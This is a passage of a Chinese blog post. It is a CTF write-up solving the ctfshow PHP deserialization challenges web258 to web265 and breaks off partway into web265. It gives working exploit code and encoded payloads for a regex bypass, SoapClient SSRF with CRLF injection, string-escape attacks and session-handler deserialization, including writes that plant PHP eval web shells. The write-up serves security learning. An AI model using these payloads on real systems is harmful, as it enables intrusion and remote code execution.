&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302195845419.png&#34; alt=&#34;image-20230302195845419&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web258&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web258&#34;&gt;#&lt;/a&gt; web258&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser&amp;#123;
    public $username=&#39;xxxxxx&#39;;
    public $password=&#39;xxxxxx&#39;;
    public $isVip=false;
    public $class = &#39;info&#39;;

    public function __construct()&amp;#123;
        $this-&amp;gt;class=new info();
    &amp;#125;
    public function login($u,$p)&amp;#123;
        return $this-&amp;gt;username===$u&amp;amp;&amp;amp;$this-&amp;gt;password===$p;
    &amp;#125;
    public function __destruct()&amp;#123;
        $this-&amp;gt;class-&amp;gt;getInfo();
    &amp;#125;

&amp;#125;

class info&amp;#123;
    public $user=&#39;xxxxxx&#39;;
    public function getInfo()&amp;#123;
        return $this-&amp;gt;user;
    &amp;#125;
&amp;#125;

class backDoor&amp;#123;
    public $code;
    public function getInfo()&amp;#123;
        eval($this-&amp;gt;code);
    &amp;#125;
&amp;#125;

$username=$_GET[&#39;username&#39;];
$password=$_GET[&#39;password&#39;];

if(isset($username) &amp;amp;&amp;amp; isset($password))&amp;#123;
    if(!preg_match(&#39;/[oc]:\d+:/i&#39;, $_COOKIE[&#39;user&#39;]))&amp;#123;
        $user = unserialize($_COOKIE[&#39;user&#39;]);
    &amp;#125;
    $user-&amp;gt;login($username,$password);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个题比起上面加上了过滤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/[oc]:\d+:/i`。意思是过滤这两种情况：`o:数字:`与`c:数字:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;加上一个 + 绕过即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class ctfShowUser&amp;#123;
    public function __construct()&amp;#123;
        $this-&amp;gt;class=new backDoor();
    &amp;#125;
&amp;#125;

class backDoor&amp;#123;
    public $code=&amp;quot;system(&#39;cat flag.php&#39;);&amp;quot;;
&amp;#125;
$a=new ctfShowUser();
$a=serialize($a);
//echo &amp;quot;\n&amp;quot;;
$a = str_replace(&#39;O:&#39;,&#39;O:+&#39;,$a);
//echo &amp;quot;\n&amp;quot;;
echo urlencode($a);
//O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302203124133.png&#34; alt=&#34;image-20230302203124133&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web259-socapclient&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web259-socapclient&#34;&gt;#&lt;/a&gt; web259-SocapClient&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

highlight_file(__FILE__);


$vip = unserialize($_GET[&#39;vip&#39;]);
//vip can get flag one key
$vip-&amp;gt;getFlag();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里就一个反序列化，然后就调用 getflag 函数，可以想到是原生类的使用，__call () 函数，是当调用未知函数时自动触发，而在 SocapClient 原生类中会有 call 函数可以进行 SSRF&lt;/p&gt;
&lt;p&gt;这里给的的 flag.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
array_pop($xff);
$ip = array_pop($xff);


if($ip!==&#39;127.0.0.1&#39;)&amp;#123;
	die(&#39;error&#39;);
&amp;#125;else&amp;#123;
	$token = $_POST[&#39;token&#39;];
	if($token==&#39;ctfshow&#39;)&amp;#123;
		file_put_contents(&#39;flag.txt&#39;,$flag);
	&amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里限制了 ip 为 127.0.0.1&lt;/p&gt;
&lt;p&gt;$_SERVER [&#39;HTTP_X_FORWARDED_FOR&#39;] 要 array_pop 两次，取第二次的值赋值给 $IP,post 传入的 token 如果 ===ctfshow 就会把 $flag 的值写入 flag.txt 里面&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$ua=&amp;quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&amp;quot;;
$client=new SoapClient(null,array(&#39;uri&#39;=&amp;gt;&amp;quot;127.0.0.1/&amp;quot;,&#39;location&#39;=&amp;gt;&amp;quot;http://127.0.0.1/flag.php&amp;quot;,&#39;user_agent&#39;=&amp;gt;$ua));
echo urlencode(serialize($client));
//O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A132%3A%22kradress%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问 flag.txt 查看 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302221314104.png&#34; alt=&#34;image-20230302221314104&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web260&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web260&#34;&gt;#&lt;/a&gt; web260&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

error_reporting(0);
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

if(preg_match(&#39;/ctfshow_i_love_36D/&#39;,serialize($_GET[&#39;ctfshow&#39;])))&amp;#123;
    echo $flag;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到题我还懵了一下，属实没想到，上一题还在 SSRF，下一题又随便传个参就过了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304111406708.png&#34; alt=&#34;image-20230304111406708&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web261&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web261&#34;&gt;#&lt;/a&gt; web261&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

highlight_file(__FILE__);

class ctfshowvip&amp;#123;
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p)&amp;#123;
        $this-&amp;gt;username=$u;
        $this-&amp;gt;password=$p;
    &amp;#125;
    public function __wakeup()&amp;#123;
        if($this-&amp;gt;username!=&#39;&#39; || $this-&amp;gt;password!=&#39;&#39;)&amp;#123;
            die(&#39;error&#39;);
        &amp;#125;
    &amp;#125;
    public function __invoke()&amp;#123;
        eval($this-&amp;gt;code);
    &amp;#125;

    public function __sleep()&amp;#123;
        $this-&amp;gt;username=&#39;&#39;;
        $this-&amp;gt;password=&#39;&#39;;
    &amp;#125;
    public function __unserialize($data)&amp;#123;
        $this-&amp;gt;username=$data[&#39;username&#39;];
        $this-&amp;gt;password=$data[&#39;password&#39;];
        $this-&amp;gt;code = $this-&amp;gt;username.$this-&amp;gt;password;
    &amp;#125;
    public function __destruct()&amp;#123;
        if($this-&amp;gt;code==0x36d)&amp;#123;
            file_put_contents($this-&amp;gt;username, $this-&amp;gt;password);
        &amp;#125;
    &amp;#125;
&amp;#125;

unserialize($_GET[&#39;vip&#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一题稍微有点意思，但不多，首先简单说一下上面用到几个方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;__construct():构造函数，类实例化时自动调用
__invoke():调用函数的方式调用一个对象时的回应方法
__wakeu():反序列化后自动调用
__sleep():序列化时会自动调用
 __unserialize():在unserialize函数执行前会先检查有无此函数，如果又，优先级最高
 __destruct():在类的一个对象被删除时自动调用
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;整个程序执行时，先进__unserialize 函数，但是在__unserialize 函数中没有能够进入__invoke 函数的方法，这里只能通过在对象被删除时制动调用__destruct 来写文件，故这里只需要满足 code 为 0x36d=877 即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class ctfshowvip&amp;#123;
    public $username=&amp;quot;877.php&amp;quot;;
    public $password=&#39;&amp;lt;?php eval($_POST[1]);&#39;;
    public $code=0x36d;
&amp;#125;
$a =new ctfshowvip();
echo serialize($a).&amp;quot;\n&amp;quot;;
echo urlencode(serialize($a));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里写入一个文件，用蚁剑连接&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304115732681.png&#34; alt=&#34;image-20230304115732681&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web262&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web262&#34;&gt;#&lt;/a&gt; web262&lt;/h2&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
error_reporting(0);
class message&amp;#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&amp;#123;
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    &amp;#125;
&amp;#125;

$f = $_GET[&#39;f&#39;];
$m = $_GET[&#39;m&#39;];
$t = $_GET[&#39;t&#39;];

if(isset($f) &amp;amp;&amp;amp; isset($m) &amp;amp;&amp;amp; isset($t))&amp;#123;
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
    setcookie(&#39;msg&#39;,base64_encode($umsg));
    echo &#39;Your message has been sent&#39;;
&amp;#125;

highlight_file(__FILE__);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;message.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class message&amp;#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&amp;#123;
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    &amp;#125;
&amp;#125;

if(isset($_COOKIE[&#39;msg&#39;]))&amp;#123;
    $msg = unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));
    if($msg-&amp;gt;token==&#39;admin&#39;)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;有替换很明显，考察字符串逃逸，这里先简单说一下什么是字符串逃逸&lt;/p&gt;
&lt;h3 id=&#34;反序列化字符串逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化字符串逃逸&#34;&gt;#&lt;/a&gt; 反序列化字符串逃逸&lt;/h3&gt;
&lt;h4 id=&#34;增加&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#增加&#34;&gt;#&lt;/a&gt; 增加&lt;/h4&gt;
&lt;p&gt;这个点在我上面的文章中没有说到，当时没想起来还有这个点，这个知识点也不麻烦，就简单的说明一下&lt;/p&gt;
&lt;p&gt;php 序列化后的格式是固定的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class demo&amp;#123;
    public $username = &amp;quot;admin&amp;quot;;
    public $passwd=&amp;quot;test&amp;quot;;
&amp;#125;
$a = new demo();
echo $b = serialize($a).&amp;quot;\n&amp;quot;;

var_dump(unserialize($b));
var_dump(unserialize(&amp;quot;O:4:\&amp;quot;demo\&amp;quot;:2:&amp;#123;s:8:\&amp;quot;username\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:4:\&amp;quot;test\&amp;quot;;&amp;#125;aaaaaaaaaaaaaaaaaaaaaaaa&amp;quot;));
var_dump(unserialize(&amp;quot;O:4:\&amp;quot;demo\&amp;quot;:2:&amp;#123;s:8:\&amp;quot;username123\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:4:\&amp;quot;test\&amp;quot;;&amp;#125;&amp;quot;));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304134324287.png&#34; alt=&#34;image-20230304134324287&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里把下面的 username 加上了 123，这里长度与前面的 8 不对应就报错，后面加上的 aaaaaaaa 不影响反序列化的结果&lt;/p&gt;
&lt;p&gt;为什么上面说有替换猜测是字符串逃逸呢？&lt;/p&gt;
&lt;p&gt;这里假如我需要更改 passwd 为 admin，不去改动 $passwd 怎么做到呢？&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class demo&amp;#123;
    public $username = &amp;quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
    public $passwd=&amp;quot;test&amp;quot;;
&amp;#125;
$a = new demo();
echo $b = serialize($a).&amp;quot;\n&amp;quot;;
echo $c= str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&amp;quot;\n&amp;quot;;
var_dump(unserialize($c));


?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304133733733.png&#34; alt=&#34;image-20230304133733733&#34; /&gt;&lt;/p&gt;
&lt;p&gt;看上面的结果，这里 passwd 已经被改为了 admin，很简单的逻辑，在前一个变量后面添加上 &amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:5:&amp;quot;admin&amp;quot;;}, 这是我们构造的 passwd 预取为 admin 的序列化后的结果，通过&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&amp;quot;\n&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一句会讲 fuck 替换为 loveU，每有一个 fuck 就会使得前一个变量的长度加一，当我们长度等于我们构造的 &amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:5:&amp;quot;admin&amp;quot;;}，这里就会顶替掉原有的&amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:4:&amp;quot;test&amp;quot;;}&lt;/p&gt;
&lt;h4 id=&#34;减少&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#减少&#34;&gt;#&lt;/a&gt; 减少&lt;/h4&gt;
&lt;p&gt;原理还是跟增加得到一样，不过是我们构造的字符添加的位置不同&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class demo&amp;#123;
    public $username = &amp;quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&amp;quot;;
    public $passwd=&amp;quot;test&amp;quot;;
&amp;#125;
$a = new demo();
echo $b = serialize($a);
$c= str_replace(&#39;fuck&#39;, &#39;you&#39;,$b).&amp;quot;\n&amp;quot;;
echo $c;
$d=$c.&amp;quot;\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
echo $d.&amp;quot;\n&amp;quot;;
var_dump(unserialize($d));
echo strlen(&amp;quot;youyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyou\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304135322961.png&#34; alt=&#34;image-20230304135322961&#34; /&gt;&lt;/p&gt;
&lt;p&gt;现在做这个就简单了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class message&amp;#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;admin&#39;;
    public function __construct($f,$m,$t)&amp;#123;
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    &amp;#125;
&amp;#125;
$f = &amp;quot;1&amp;quot;;
$m = &amp;quot;1&amp;quot;;
$t = &amp;quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&amp;quot;;s:5:\&amp;quot;token\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
$a = new message($f,$m,$t);

echo serialize($a).&amp;quot;\n&amp;quot;;
echo base64_encode(str_replace(&#39;fuck&#39;, &#39;loveU&#39;,serialize($a))).&amp;quot;\n&amp;quot;;
echo urlencode(serialize($a)).&amp;quot;\n&amp;quot;;
echo strlen(&amp;quot;1loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&amp;quot;);
/*
O:7:&amp;quot;message&amp;quot;:4:&amp;#123;s:4:&amp;quot;from&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;msg&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:2:&amp;quot;to&amp;quot;;s:136:&amp;quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&amp;quot;;s:5:&amp;quot;token&amp;quot;;s:5:&amp;quot;admin&amp;quot;;&amp;#125;&amp;quot;;s:5:&amp;quot;token&amp;quot;;s:5:&amp;quot;admin&amp;quot;;&amp;#125;
Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzY6IjFsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30=
O%3A7%3A%22message%22%3A4%3A%7Bs%3A4%3A%22from%22%3Bs%3A1%3A%221%22%3Bs%3A3%3A%22msg%22%3Bs%3A1%3A%221%22%3Bs%3A2%3A%22to%22%3Bs%3A136%3A%221fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D
136
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304125625217.png&#34; alt=&#34;image-20230304125625217&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web263&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web263&#34;&gt;#&lt;/a&gt; web263&lt;/h2&gt;
&lt;p&gt;这题考察的是 Session 反序列化，扫描目录能拿到 www.zip 文件&lt;/p&gt;
&lt;p&gt;首先是 index.php 文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
session_start();
//超过5次禁止登陆
if (isset($_SESSION[&#39;limit&#39;])) &amp;#123;
	$_SESSION[&#39;limti&#39;] &amp;gt; 5 ? die(&amp;quot;登陆失败次数超过限制&amp;quot;) : $_SESSION[&#39;limit&#39;] = base64_decode($_COOKIE[&#39;limit&#39;]);
	$_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) + 1);
&amp;#125; else &amp;#123;
	setcookie(&amp;quot;limit&amp;quot;, base64_encode(&#39;1&#39;));
	$_SESSION[&#39;limit&#39;] = 1;
&amp;#125;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;])&lt;/code&gt;  来控制 session 的值&lt;/p&gt;
&lt;p&gt;在 inc.php 文件中，首先这里把 session.serialize_handler 设置为了 php, 和 index.php 不一致，可以利用来进行反序列化&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
ini_set(&#39;display_errors&#39;, 0);
ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);

date_default_timezone_set(&amp;quot;Asia/Shanghai&amp;quot;);
session_start();
use \CTFSHOW\CTFSHOW; 
require_once &#39;CTFSHOW.php&#39;;
$db = new CTFSHOW([
    &#39;database_type&#39; =&amp;gt; &#39;mysql&#39;,
    &#39;database_name&#39; =&amp;gt; &#39;web&#39;,
    &#39;server&#39; =&amp;gt; &#39;localhost&#39;,
    &#39;username&#39; =&amp;gt; &#39;root&#39;,
    &#39;password&#39; =&amp;gt; &#39;root&#39;,
    &#39;charset&#39; =&amp;gt; &#39;utf8&#39;,
    &#39;port&#39; =&amp;gt; 3306,
    &#39;prefix&#39; =&amp;gt; &#39;&#39;,
    &#39;option&#39; =&amp;gt; [
        PDO::ATTR_CASE =&amp;gt; PDO::CASE_NATURAL
    ]
]);

// sql注入检查
function checkForm($str)&amp;#123;
    if(!isset($str))&amp;#123;
        return true;
    &amp;#125;else&amp;#123;
    return preg_match(&amp;quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#39;|\&amp;quot;|\&amp;lt;|\,|\&amp;gt;|\?/i&amp;quot;,$str);
    &amp;#125;
&amp;#125;


class User&amp;#123;
    public $username;
    public $password;
    public $status;
    function __construct($username,$password)&amp;#123;
        $this-&amp;gt;username = $username;
        $this-&amp;gt;password = $password;
    &amp;#125;
    function setStatus($s)&amp;#123;
        $this-&amp;gt;status=$s;
    &amp;#125;
    function __destruct()&amp;#123;
        file_put_contents(&amp;quot;log-&amp;quot;.$this-&amp;gt;username, &amp;quot;使用&amp;quot;.$this-&amp;gt;password.&amp;quot;登陆&amp;quot;.($this-&amp;gt;status?&amp;quot;成功&amp;quot;:&amp;quot;失败&amp;quot;).&amp;quot;----&amp;quot;.date_create()-&amp;gt;format(&#39;Y-m-d H:i:s&#39;));
    &amp;#125;
&amp;#125;

/*生成唯一标志
*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)
*/

function  uuid()  
&amp;#123;  
    $chars = md5(uniqid(mt_rand(), true));  
    $uuid = substr ( $chars, 0, 8 ) . &#39;-&#39;
            . substr ( $chars, 8, 4 ) . &#39;-&#39; 
            . substr ( $chars, 12, 4 ) . &#39;-&#39;
            . substr ( $chars, 16, 4 ) . &#39;-&#39;
            . substr ( $chars, 20, 12 );  
    return $uuid ;  
&amp;#125;  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里可以反序列化后可以写文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class User&amp;#123;
    public $username=&#39;2.php&#39;;
    public $password = &#39;&amp;lt;?php phpinfo();eval($_POST[1]);?&amp;gt;&#39;;
&amp;#125;
$a=new User();

echo  base64_encode(&amp;quot;|&amp;quot;.serialize($a));
//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs/PiI7fQ==

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183010822.png&#34; alt=&#34;image-20230304183010822&#34; /&gt;&lt;/p&gt;
&lt;p&gt;然后访问一下 check.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183043807.png&#34; alt=&#34;image-20230304183043807&#34; /&gt;&lt;/p&gt;
&lt;p&gt;最后访问 log-2.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183112672.png&#34; alt=&#34;image-20230304183112672&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web264&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web264&#34;&gt;#&lt;/a&gt; web264&lt;/h2&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
session_start();

class message&amp;#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&amp;#123;
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    &amp;#125;
&amp;#125;

$f = $_GET[&#39;f&#39;];
$m = $_GET[&#39;m&#39;];
$t = $_GET[&#39;t&#39;];

if(isset($f) &amp;amp;&amp;amp; isset($m) &amp;amp;&amp;amp; isset($t))&amp;#123;
    $msg = new message($f,$m,$t);
    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
    $_SESSION[&#39;msg&#39;]=base64_encode($umsg);
    echo &#39;Your message has been sent&#39;;
&amp;#125;

highlight_file(__FILE__);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;message.php&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
session_start();
highlight_file(__FILE__);
include(&#39;flag.php&#39;);

class message&amp;#123;
    public $from;
    public $msg;
    public $to;
    public $token=&#39;user&#39;;
    public function __construct($f,$m,$t)&amp;#123;
        $this-&amp;gt;from = $f;
        $this-&amp;gt;msg = $m;
        $this-&amp;gt;to = $t;
    &amp;#125;
&amp;#125;

if(isset($_COOKIE[&#39;msg&#39;]))&amp;#123;
    $msg = unserialize(base64_decode($_SESSION[&#39;msg&#39;]));
    if($msg-&amp;gt;token==&#39;admin&#39;)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看了半天才反应过来，这里少了一个 setcookie (&#39;msg&#39;,base64_encode ($umsg));，做法稍微有一点改动&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110134330.png&#34; alt=&#34;image-20230305110134330&#34; /&gt;&lt;/p&gt;
&lt;p&gt;首先在首页将 payload 传入，payload 为什么是这样的详看 262，这里访问后会有一个 session，带着这个 session 访问 message 即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110259089.png&#34; alt=&#34;image-20230305110259089&#34; /&gt;&lt;/p&gt;
&lt;p&gt;还得加上 msg&lt;/p&gt;
&lt;h2 id=&#34;web265&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web265&#34;&gt;#&lt;/a&gt; web265&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
include(&#39;flag.php&#39;);
highlight_file(__FILE__);
class ctfshowAdmin&amp;#123;
    public $token;
    public $password;

    public function __construct($t,$p)&amp;#123;
        $this-&amp;gt;token=$t;
        $this-&amp;gt;password = $p;
    &amp;#125;
    public function login()&amp;#123;
